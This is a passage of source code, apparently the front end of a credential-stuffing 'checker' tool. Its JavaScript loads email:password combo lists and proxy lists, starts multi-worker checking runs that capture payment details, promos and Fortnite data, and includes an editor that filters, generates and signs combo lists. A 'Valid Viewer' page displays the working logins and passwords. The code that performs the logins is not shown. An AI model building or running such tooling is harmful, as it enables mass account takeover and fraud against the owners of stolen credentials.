  inp.style.marginTop='8px';
  box.appendChild(inp);
  pxSyncMinus();
}
function pxDelUrl(){
  var box=document.getElementById('pxUrls');
  if(box && box.lastElementChild) box.removeChild(box.lastElementChild);
  pxSyncMinus();
}
function pxSaveOpen(){
  document.getElementById('pxSaveName').value='';
  document.getElementById('pxSaveModal').classList.remove('hide');
}
function pxCollectUrls(){
  return Array.prototype.map.call(document.querySelectorAll('#pxUrls input'), function(i){ return i.value.trim(); }).filter(Boolean);
}
async function pxSaveServer(){
  var urls=pxCollectUrls();
  if(!urls.length) return;
  var name=(document.getElementById('pxSaveName').value||'').trim();
  if(!name) return;
  await fetch('/api/proxy-lists',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'server',name:name,urls:urls})});
  document.getElementById('pxSaveModal').classList.add('hide');
  loadProxyMenu('server');
}
async function pxTestServer(){
  var tag=document.getElementById('pxCount'); tag.textContent='checking…';
  var r=await fetch('/api/proxy-fetch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({urls:pxCollectUrls()})});
  if(!r.ok){ tag.textContent='failed'; return; }
  var d=await r.json();
  tag.textContent=(d.count||0)+' proxies';
}
async function pxTestFile(){
  var tag=document.getElementById('pxFileCount'); if(!tag) return;
  tag.textContent='checking…';
  var path=(document.getElementById('proxy')&&document.getElementById('proxy').value)||'';
  var r=await fetch('/api/proxy-fetch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({path:path})});
  if(!r.ok){ tag.textContent='failed'; return; }
  var d=await r.json();
  tag.textContent=(d.count||0)+' proxies';
}
async function rememberProxy(){
  var box = document.getElementById('rememberProxyBox');
  var path = document.getElementById('proxy').value;
  if(!path){ if(box) box.checked=false; return; }
  if(box && !box.checked) return;
  await fetch('/api/proxy-lists', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({path:path, name:path.split(/[/\\\\]/).pop()})});
  if(box) box.checked = true;
  loadProxyMenu();
}
async function loadProxyMenu(kind){
  kind=kind||window.pxKind||'file';
  const list = await (await fetch('/api/proxy-lists')).json();
  const menu = document.getElementById(kind==='server'?'proxySrvMenu':'proxyMenu');
  if(!menu) return;
  var rows=(list||[]).filter(function(x){ return kind==='server' ? x.type==='server' : x.type!=='server'; });
  if(!rows.length){ menu.innerHTML = '<div class="muted">Nothing saved</div>'; return; }
  menu.innerHTML = rows.map(function(x,i){
    var meta=kind==='server' ? ((x.urls&&x.urls.length||0)+' urls · '+(x.count||0)+' proxies') : ((x.count||0)+' proxies · '+(x.path||''));
    return '<div><span onclick="useProxySaved('+i+',\''+kind+'\')" style="flex:1;display:flex;justify-content:space-between;gap:10px;align-items:center"><b>'+(x.name||'list')+'</b><span class="tag">'+meta+'</span></span><button class="ghost" type="button" onclick="event.stopPropagation();deleteProxySaved(\''+String(x.name||'').replace(/'/g,'')+'\',\''+String(x.path||'').replace(/\\\\/g,'/').replace(/'/g,'')+'\',\''+kind+'\')">✕</button></div>';
  }).join('');
  window._pxSaved=list||[];
}
function useProxySaved(i,kind){
  var list=window._pxSaved||[];
  var x=list.filter(function(z){ return kind==='server' ? z.type==='server' : z.type!=='server'; })[i];
  if(!x) return;
  if(kind==='server'){
    document.getElementById('pxUrls').innerHTML='';
    (x.urls||[]).forEach(function(u){ pxAddUrl(u); });
    document.getElementById('pxCount').textContent='0 proxies';
    document.getElementById('proxySrvMenu').classList.remove('on');
  } else {
    document.getElementById('proxy').value=x.path||'';
    var fc=document.getElementById('pxFileCount'); if(fc) fc.textContent='0 proxies';
    document.getElementById('proxyMenu').classList.remove('on');
  }
}
async function deleteProxySaved(name, path, kind){
  await fetch('/api/proxy-lists?name='+encodeURIComponent(name)+'&path='+encodeURIComponent(path),{method:'DELETE'});
  loadProxyMenu(kind);
}
function toggleProxyMenu(kind){ var m=document.getElementById(kind==='server'?'proxySrvMenu':'proxyMenu'); m.classList.toggle('on'); loadProxyMenu(kind); }
async function pauseRun(){
  await fetch('/api/pause', {method:'POST'});
  refresh();
}
async function stopRun(){
  await fetch('/api/stop', {method:'POST'});
  window._started = false;
  show('menu');
  refresh();
}
async function startCheck(resume){
  var err = document.getElementById('setupErr');
  if(err) err.textContent = '';
  var combo = document.getElementById('combo') ? document.getElementById('combo').value : '';
  if(!resume && !combo){
    if(err) err.textContent = 'Pick a combo file first (email:pass list), not the proxy list.';
    show('setup');
    return;
  }
  if(/proxy/i.test(combo) && err){
    err.textContent = 'Combos is a proxy file. Browse the email:pass combo list in Combos.';
  }
  show('run');
  window._started = true;
  const body = {
    combo: combo,
    proxy: document.getElementById('proxy') ? document.getElementById('proxy').value : '',
    proxy_mode: window.pxKind||'file',
    proxy_urls: (typeof pxCollectUrls==='function')?pxCollectUrls():[],
    keywords: document.getElementById('kw') ? document.getElementById('kw').value : '',
    workers: document.getElementById('workers') ? document.getElementById('workers').value : '20',
    resume: resume,
    session_file: picked,
    keywords_on: !!(document.getElementById('capKw') && document.getElementById('capKw').checked),
    payments_on: !!(document.getElementById('capPay') && document.getElementById('capPay').checked),
    promos_on: !!(document.getElementById('capPromo') && document.getElementById('capPromo').checked),
    fortnite_on: !!(document.getElementById('capFn') && document.getElementById('capFn').checked)
  };
  try {
    const res = await fetch('/api/start', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body)});
    if (!res.ok) {
      var msg = await res.text();
      if(err) err.textContent = msg;
      show('setup');
      return;
    }
    window._started = true;
    show('run');
    refresh();
  } catch(e) {
    if(err) err.textContent = String(e);
    show('setup');
  }
}
async function openViewer(){
  await fetch('/api/open-viewer', {method:'POST'});
}
function openLink(u){
  fetch('/api/open-link?u='+encodeURIComponent(u));
}
function goEditor(){ show('editor'); edBackHome(); edBanners(); }
function edFmt(n){ n=Number(n)||0; if(n<1024) return n+' B'; if(n<1048576) return (n/1024).toFixed(1)+' KB'; if(n<1073741824) return (n/1048576).toFixed(1)+' MB'; return (n/1073741824).toFixed(2)+' GB'; }
function edTab(mode){
  ['load','new','sign'].forEach(function(m){
    var box=document.getElementById(m==='load'?'edLoadBox':m==='new'?'edNewBox':'edSignBox');
    if(box) box.classList.toggle('hide', m!==mode);
    var tb=document.getElementById(m==='load'?'tabLoad':m==='new'?'tabNew':'tabSign');
    if(tb) tb.classList.toggle('on', m===mode);
  });
  document.getElementById('edTitle').textContent = mode==='new'?'GENERATE':mode==='sign'?'SIGNATURES':'LOAD / CLEAN';
}
function edShowWork(mode){
  document.getElementById('edHome').classList.add('hide');
  document.getElementById('edWork').classList.remove('hide');
  var isNew = mode==='new';
  document.getElementById('tabLoad').classList.toggle('hide', isNew);
  document.getElementById('tabNew').classList.toggle('hide', !isNew);
  edTab(isNew?'new':'load');
}
function edBackHome(){
  document.getElementById('edHome').classList.remove('hide');
  document.getElementById('edWork').classList.add('hide');
}
function edOpenLoad(){ edShowWork('load'); }
function edOpenNew(){ edShowWork('new'); }
window.edAll={domains:[],urls:[]}; window.edSel={email:{},host:{}}; window.edShowAll=false;
function edErr(msg){
  var tab=document.getElementById('edSignBox');
  var onSign=tab && !tab.classList.contains('hide');
  var e=document.getElementById(onSign?'edSigMsg':'edErr');
  if(e) e.textContent=msg||'';
  var o=document.getElementById(onSign?'edErr':'edSigMsg');
  if(o && o!==e) o.textContent='';
}
function edFilt(msg){ var e=document.getElementById('edFilterStatus'); if(e) e.textContent=msg||''; }
function edOpenExport(mode){
  window.edExpMode=mode||'filter';
  var m=document.getElementById('edExportMenu');
  if(m) m.classList.remove('hide');
}
function edResetFilterBtn(){
  var b=document.getElementById('edFilterBtn'); if(b) b.textContent='Filter';
  var x=document.getElementById('edExportBtn'); if(x) x.classList.add('hide');
}
function edPaintFilter(d){
  window.edFilterAll=d.domains||window.edFilterAll||[];
  var head=document.getElementById('edFilterHead');
  if(head) head.classList.remove('hide');
  var box=document.getElementById('edFilterHits'); if(!box) return;
  box.innerHTML='';
  window.edFilterAll.slice(0,10).forEach(function(x){ box.appendChild(edStatRow(x,'email')); });
}
function edRunFilter(){
  var btn=document.getElementById('edFilterBtn');
  btn.textContent='Filtering';
  document.getElementById('edExportBtn').classList.add('hide');
  edFilt('Filtering…');
  if(window.edFS){ try{window.edFS.close();}catch(e){} }
  var q='path='+encodeURIComponent(document.getElementById('edPath').value)+
    '&email_types='+encodeURIComponent(document.getElementById('edMailTypes').value)+
    '&url='+encodeURIComponent(document.getElementById('edURL').value);
  var es=new EventSource('/api/editor/filter-stream?'+q);
  window.edFS=es;
  es.onmessage=function(ev){
    try{
      var d=JSON.parse(ev.data);
      edPaintFilter(d);
      if(d.done){
        es.close();
        btn.textContent='Filtered';
        document.getElementById('edExportBtn').classList.remove('hide');
        edFilt('Filtered '+(d.extracted||0)+' combos');
      } else {
        edFilt('Filtering… '+(d.extracted||0)+' hits / '+(d.scanned||0)+' scanned');
      }
    }catch(e){}
  };
  es.onerror=function(){ es.close(); btn.textContent='Filter'; edFilt('Filter stopped'); };
}
function edPaint(d){
  if(d && d.error){ edErr(d.error); return; }
  if(d.done) edErr('Analyzed '+(d.lines||0)+' lines');
  else edErr('Analyzing… '+(d.lines||0)+' lines');
  if(d.path) document.getElementById('edPath').value = d.path;
  if(d.dest) document.getElementById('edSavePath').value = d.dest;
  document.getElementById('edLines').textContent = (d.lines||0)+' lines';
  document.getElementById('edSize').textContent = edFmt(d.size||0);
  if(!d.done && d.domains && d.domains.length){
    window.edAll.domains = d.domains;
    window.edAll.urls = d.urls||window.edAll.urls||[];
  } else {
    window.edAll.domains = d.domains||window.edAll.domains||[];
    window.edAll.urls = d.urls||window.edAll.urls||[];
  }
  edRenderLists();
}
function edStatRow(x, kind){
  var row=document.createElement('div'); row.className='ed-item';
  var name=document.createElement('b'); name.textContent=x.name;
  var cnt=document.createElement('span'); cnt.style.color='#8b97ad'; cnt.textContent=String(x.count);
  var btn=document.createElement('button'); btn.className='ico-btn'; btn.type='button';
  btn.innerHTML='<svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M12 3v12M8 11l4 4 4-4M4 21h16" stroke="#e8edf7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
  btn.onclick=function(){ edSaveOne(kind, x.name); };
  row.appendChild(name); row.appendChild(cnt); row.appendChild(btn);
  return row;
}
function edRenderLists(){
  function draw(id, arr, kind){
    var el=document.getElementById(id); if(!el) return; el.innerHTML='';
    (arr||[]).slice(0,10).forEach(function(x){ el.appendChild(edStatRow(x, kind)); });
  }
  draw('edDomains', window.edAll.domains, 'email');
  draw('edUrls', window.edAll.urls, 'host');
}
function edCloseModal(){ document.getElementById('edModal').classList.add('hide'); }
function edViewAll(kind){
  var box=document.getElementById('edModal');
  var list=document.getElementById('edModalList');
  document.getElementById('edModalTitle').textContent = kind==='host' ? 'URL / DOMAINS' : 'EMAIL TYPES';
  list.innerHTML='';
  var arr=kind==='host'?window.edAll.urls:(kind==='filter'?window.edFilterAll:window.edAll.domains);
  if(kind==='filter') kind='email';
  (arr||[]).forEach(function(x){
    var row=document.createElement('div'); row.className='ed-item';
    var name=document.createElement('b'); name.textContent=x.name;
    var cnt=document.createElement('span'); cnt.className='tag'; cnt.textContent=String(x.count);
    var btn=document.createElement('button'); btn.className='ico-btn'; btn.type='button';
    btn.innerHTML='<svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M12 3v12M8 11l4 4 4-4M4 21h16" stroke="#e8edf7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
    btn.onclick=function(){ edSaveOne(kind, x.name); };
    row.appendChild(name); row.appendChild(cnt); row.appendChild(btn);
    list.appendChild(row);
  });
  box.classList.remove('hide');
}
async function edSaveOne(kind, name){
  var def=name.replace(/[^\w.\-]+/g,'_')+'.txt';
  var r=await (await fetch('/api/pick-save?name='+encodeURIComponent(def))).json();
  if(!r.path) return;
  edErr('Exporting '+name+'…');
  var body={path:document.getElementById('edPath').value,dest:r.path,banner:edSigText('edSigHead'),banner_end:edSigText('edSigTail')};
  if(kind==='email') body.email_types='@'+name;
  else body.url=name;
  var res=await fetch('/api/editor/filter',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
  if(!res.ok){ edErr(await res.text()); return; }
  var d=await res.json();
  edErr('Saved '+(d.extracted||0)+' to '+(d.dest||r.path));
}
async function edBrowse(){
  var r = await (await fetch('/api/pick?kind=editor')).json();
  if(r.path){ document.getElementById('edPath').value=r.path; edLoad(); }
}
async function edBrowsePass(){
  var r = await (await fetch('/api/pick?kind=editor-pass')).json();
  if(!r.path) return;
  document.getElementById('edPassPath').value=r.path;
  var d = await (await fetch('/api/editor/analyze',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({path:r.path})})).json();
  document.getElementById('edPasses').value = d.large ? (d.preview||'') : (d.text||d.preview||'');
}
function edLoad(){
  var p=document.getElementById('edPath').value.trim();
  if(!p){ edErr('Choose a file first'); return; }
  edErr('Analyzing…');
  if(window.edES){ try{window.edES.close();}catch(e){} }
  var es=new EventSource('/api/editor/analyze-stream?path='+encodeURIComponent(p));
  window.edES=es;
  es.onmessage=function(ev){
    try{
      var d=JSON.parse(ev.data);
      edPaint(d);
      if(d.done){ es.close(); edErr('Analyzed '+(d.lines||0)+' lines'); }
      else edErr('Analyzing… '+(d.lines||0)+' lines');
    }catch(e){}
  };
  es.onerror=function(){ es.close(); };
}
function edNew(){
  document.getElementById('edPath').value='';
  void 0;
  edPaint({lines:0,size:0,kinds:{},domains:[],urls:[]});
}
async function edAnalyze(){
  var d = await (await fetch('/api/editor/analyze',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:((document.getElementById('edText')||{}).value||''),path:document.getElementById('edPath').value})})).json();
  edPaint(d);
}
async function edExtract(){
  var dest=document.getElementById('edSavePath').value.trim();
  edErr('Extracting…');
  try{
    var res = await fetch('/api/editor/extract',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:((document.getElementById('edText')||{}).value||''),path:document.getElementById('edPath').value,dest:dest,banner:edSigText('edSigHead'),banner_end:edSigText('edSigTail')})});
    if(!res.ok){ edErr(await res.text()); return; }
    var d = await res.json();
    edPaint(d);
    edErr('Saved '+(d.extracted||d.lines||0)+' combos to '+(d.dest||d.path||''));
  }catch(e){ edErr(String(e)); }
}
async function edExportFilter(){
  if(window.edExpMode==='gen'){
    var r=await (await fetch('/api/pick-save?name='+encodeURIComponent('combos-export.txt'))).json();
    if(!r.path) return;
    var text=document.getElementById('edGenOut').value||'';
    var head=edSigText('edSigHead');
    var tail=edSigText('edSigTail');
    if(head) text=head.replace(/\s+$/,'')+'\n'+text;
    if(tail) text=text.replace(/\s+$/,'')+'\n'+tail;
    await fetch('/api/editor/save',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({path:r.path,text:text})});
    document.getElementById('edExportMenu').classList.add('hide');
    return;
  }
  var url=(document.getElementById('edURL').value||'filtered').replace(/[^\w.\-]+/g,'_');
  var r=await (await fetch('/api/pick-save?name='+encodeURIComponent(url+'.txt'))).json();
  if(!r.path) return;
  edFilt('Saving…');
  try{
    var res = await fetch('/api/editor/filter',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({
      path:document.getElementById('edPath').value,
      dest:r.path,
      email_types:document.getElementById('edMailTypes').value,
      url:document.getElementById('edURL').value,
      banner:edSigText('edSigHead'),
      banner_end:edSigText('edSigTail')
    })});
    if(!res.ok){ edFilt(await res.text()); return; }
    var d = await res.json();
    document.getElementById('edExportMenu').classList.add('hide');
    edFilt('Saved '+(d.extracted||0)+' combos to '+(d.dest||r.path));
  }catch(e){ edFilt(String(e)); }
}
function edDedup(){
  var seen={}; var out=[];
  ((document.getElementById('edText')||{}).value||'').split(/\r?\n/).forEach(function(ln){
    var k=ln.trim().toLowerCase(); if(!k||seen[k]) return; seen[k]=1; out.push(ln.trim());
  });
  void 0;
  edAnalyze();
}
async function edGen(){
  var d = await (await fetch('/api/editor/generate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({
    users:document.getElementById('edUsers').value,
    domains:document.getElementById('edDoms').value,
    passwords:document.getElementById('edPasses').value,
    count:parseInt(document.getElementById('edCount').value||'500',10)
  })})).json();
  var out=document.getElementById('edGenOut');
  if(out) out.value = d.text||'';
  edPaint(d);
}
async function edBanners(){
  var d = await (await fetch('/api/editor/banners')).json();
  window.edBans = d.banners||[];
  function fill(id, blank){
    var sel=document.getElementById(id); if(!sel) return;
    sel.innerHTML='<option value="">'+blank+'</option>';
    window.edBans.forEach(function(b,i){
      var o=document.createElement('option'); o.value=String(i); o.textContent=b.name; o.dataset.text=b.text||''; sel.appendChild(o);
    });
  }
  fill('edBannerSel','');
  fill('edSigHead','');
  fill('edSigTail','');
  fill('edSigHeadGen','');
  fill('edSigTailGen','');
}
function edLoadSig(){
  var sel=document.getElementById('edBannerSel');
  var o=sel && sel.options[sel.selectedIndex];
  if(o && o.dataset.text) document.getElementById('edBanner').value=o.dataset.text;
  if(o && o.textContent) document.getElementById('edBannerName').value=o.textContent;
}
async function edDeleteSig(){
  var sel=document.getElementById('edBannerSel');
  var o=sel && sel.options[sel.selectedIndex];
  if(!o || !o.textContent) return;
  await fetch('/api/editor/banners?name='+encodeURIComponent(o.textContent),{method:'DELETE'});
  document.getElementById('edBanner').value='';
  document.getElementById('edBannerName').value='';
  edBanners();
}
function edSigText(id){
  var sel=document.getElementById(id); if(!sel) return '';
  var o=sel.options[sel.selectedIndex];
  return (o && o.dataset.text) ? o.dataset.text : '';
}
async function edSaveBanner(){
  var name=document.getElementById('edBannerName').value.trim();
  var text=document.getElementById('edBanner').value;
  if(!name || !text){ edErr('Name and signature text required'); return; }
  var r = await fetch('/api/editor/banners',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:name,text:text})});
  if(r.ok){ edErr('Signature saved'); edBanners(); } else { edErr('Save failed'); }
}
async function edBrowseSave(id){
  var r = await (await fetch('/api/pick-save')).json();
  if(r.path) document.getElementById(id||'edSavePath').value=r.path;
}
function edNameMode(m){
  document.getElementById('edUsers').classList.toggle('hide', m==='file');
  document.getElementById('edNameFile').classList.toggle('hide', m!=='file');
}
function edPassMode(m){
  document.getElementById('edPasses').classList.toggle('hide', m==='file');
  document.getElementById('edPassFile').classList.toggle('hide', m!=='file');
}
async function edBrowseNames(){
  var r = await (await fetch('/api/pick?kind=editor-names')).json();
  if(!r.path) return;
  document.getElementById('edNamePath').value=r.path;
  var d = await (await fetch('/api/editor/analyze',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({path:r.path})})).json();
  document.getElementById('edUsers').value = d.large ? (d.preview||'') : (d.text||d.preview||'');
}
async function edSave(){
  var path=(document.getElementById('edSavePathGen')&&document.getElementById('edSavePathGen').value.trim())||(document.getElementById('edSavePath')&&document.getElementById('edSavePath').value.trim())||'';
  var gen=document.getElementById('edGenOut');
  var text=(gen && !document.getElementById('edNewBox').classList.contains('hide')) ? gen.value : ((document.getElementById('edText')||{}).value||'');
  if(!path){ var p = await (await fetch('/api/pick-save')).json(); path=p.path||'combos-export.txt'; document.getElementById('edSavePath').value=path; }
  var r = await fetch('/api/editor/save',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({path:path,text:text,banner:edSigText('edSigHeadGen')||edSigText('edSigHead'),banner_end:edSigText('edSigTailGen')||edSigText('edSigTail')})});
  if(r.ok){ edErr('Exported to '+path); } else { edErr(await r.text()); }
}
setInterval(refresh, 1200);
(async function checkUpdate(){
  try{
    var d=await (await fetch('/api/update/check')).json();
    if(!d||!d.ok||!d.update) return;
    var box=document.getElementById('updAsk');
    if(document.getElementById('updTitle')) document.getElementById('updTitle').textContent='Version '+d.remote+' is available';
    if(box) box.classList.remove('hide');
    var later=document.getElementById('updLater');
    if(later) later.onclick=function(){ if(box) box.classList.add('hide'); };
    var now=document.getElementById('updNow');
    if(now) now.onclick=async function(){
      now.disabled=true; now.textContent='Updating…';
      var err=document.getElementById('updErr');
      try{
        var r=await (await fetch('/api/update/apply',{method:'POST'})).json();
        if(!r.ok){ if(err) err.textContent=r.error||'update failed'; now.disabled=false; now.textContent='Update now'; return; }
        if(err) err.textContent='Restarting…';
      }catch(e){ if(err) err.textContent=String(e); now.disabled=false; now.textContent='Update now'; }
    };
  }catch(e){}
})();
</script></body></html>
`

const viewerHTML = `<!DOCTYPE html>
<html lang="en">
<head>
<link rel="icon" type="image/png" href="data:image/png;base64,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"/>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>Valid Viewer</title>
<style>
  :root {
    --bg: #0b0d12;
    --bg2: #12161f;
    --card: #161b26;
    --card-hover: #1c2330;
    --border: #2a3344;
    --text: #e8edf7;
    --muted: #8b97ad;
    --accent: #7c5cff;
    --accent2: #3ddc97;
    --chip: #222a3a;
    --shadow: 0 10px 40px rgba(0,0,0,.35);
    --radius: 16px;
  }
  * { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
    background:
      radial-gradient(1200px 600px at 10% -10%, rgba(124,92,255,.18), transparent 50%),
      radial-gradient(900px 500px at 100% 0%, rgba(61,220,151,.10), transparent 45%),
      var(--bg);
    color: var(--text);
    min-height: 100vh;
  }
  header {
    position: sticky; top: 0; z-index: 20;
    backdrop-filter: blur(14px);
    background: rgba(11,13,18,.82);
    border-bottom: 1px solid var(--border);
    padding: 16px 22px;
  }
  .wrap { max-width: 1400px; margin: 0 auto; padding: 0 18px 40px; }
  .title-row {
    display: flex; flex-wrap: wrap; gap: 12px; align-items: center;
    justify-content: space-between; margin-bottom: 14px;
  }
  h1 {
    margin: 0; font-size: 1.35rem; letter-spacing: .3px;
    background: linear-gradient(90deg, #c4b5ff, #7c5cff 40%, #3ddc97);
    -webkit-background-clip: text; color: transparent;
  }
  .sub { color: var(--muted); font-size: .85rem; margin-top: 2px; }
  .controls {
    display: grid;
    grid-template-columns: 1.6fr repeat(3, minmax(120px, .7fr)) auto auto;
    gap: 10px; align-items: center;
  }
  @media (max-width: 960px) {
    .controls { grid-template-columns: 1fr 1fr; }
  }
  input, select, button {
    font: inherit; color: var(--text);
    background: var(--bg2); border: 1px solid var(--border);
    border-radius: 12px; padding: 10px 12px; outline: none;
  }
  input:focus, select:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(124,92,255,.2); }
  button {
    cursor: pointer; background: linear-gradient(135deg, #7c5cff, #5b8dff);
    border: none; font-weight: 600; transition: transform .12s ease, filter .12s ease;
  }
  button:hover { filter: brightness(1.08); transform: translateY(-1px); }
  button.secondary {
    background: var(--chip); border: 1px solid var(--border); font-weight: 500;
  }
  .stats {
    display: grid; grid-template-columns: 1fr 1fr; gap: 12px;
    margin: 18px 0 8px;
  }
  @media (max-width: 800px) { .stats { grid-template-columns: 1fr 1fr; } }
  .stat {
    background: linear-gradient(180deg, rgba(255,255,255,.03), transparent), var(--card);
    border: 1px solid var(--border); border-radius: var(--radius);
    padding: 14px 16px; box-shadow: var(--shadow);
  }
  .stat .label { color: var(--muted); font-size: .78rem; text-transform: uppercase; letter-spacing: .06em; }
  .stat .value { font-size: 1.45rem; font-weight: 700; margin-top: 4px; }
  .chips { display: flex; flex-wrap: wrap; gap: 8px; margin: 12px 0 4px; }
  .chip {
    background: var(--chip); border: 1px solid var(--border); color: var(--muted);
    border-radius: 999px; padding: 6px 12px; font-size: .8rem; cursor: pointer;
    transition: .15s ease;
  }
  .chip:hover, .chip.active {
    color: var(--text); border-color: var(--accent);
    background: rgba(124,92,255,.18);
  }
  .grid {
    display: grid; grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
    gap: 14px; margin-top: 16px;
  }
  .card {
    background: linear-gradient(180deg, rgba(255,255,255,.03), transparent 40%), var(--card);
    border: 1px solid var(--border); border-radius: var(--radius);
    padding: 16px; box-shadow: var(--shadow);
    transition: border-color .15s ease, transform .15s ease, background .15s ease;
    display: flex; flex-direction: column; gap: 10px;
  }
  .card:hover { border-color: #3d4a63; background: var(--card-hover); transform: translateY(-2px); }
  .card-top { display: flex; justify-content: space-between; gap: 8px; align-items: flex-start; }
  .email {
    font-weight: 700; font-size: 1.02rem; word-break: break-all;
    color: #f2f5ff;
  }
  .line-no { color: var(--muted); font-size: .75rem; white-space: nowrap; }
  .pass {
    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
    background: #0e121a; border: 1px solid var(--border); border-radius: 10px;
    padding: 8px 10px; display: flex; justify-content: space-between; gap: 8px; align-items: center;
  }
  .pass code { color: var(--accent2); word-break: break-all; }
  .kv { display: grid; gap: 6px; }
  .kv-row {
    display: grid; grid-template-columns: 110px 1fr; gap: 8px;
    padding: 7px 10px; border-radius: 10px; background: rgba(0,0,0,.18);
  }
  .kv-row .k { color: var(--muted); font-size: .78rem; text-transform: uppercase; letter-spacing: .04em; }
